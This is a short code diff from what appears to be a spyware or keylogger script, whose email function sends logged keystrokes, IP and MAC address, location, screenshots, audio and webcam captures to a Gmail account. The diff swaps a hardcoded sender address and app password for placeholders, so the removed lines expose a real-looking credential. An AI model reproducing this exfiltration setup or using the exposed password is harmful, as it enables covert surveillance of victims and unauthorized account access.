@@ -170,9 +170,9 @@ def email(logged_data, ip_address, mac_address, isp, location, screenshot_path, 
 def send_email(subject, message, screenshot_path, audio_file_path, webcam_path):
     smtp_server = "smtp.gmail.com"
     port = 465
-    sender_email = "cygnusfederation@gmail.com"
-    password = "masg oiel qmdq iwhg"
-    receiver_email = "cygnusfederation@gmail.com"
+    sender_email = "add email"
+    password = "password"
+    receiver_email = "recovery email any"
 
     context = ssl.create_default_context()
 
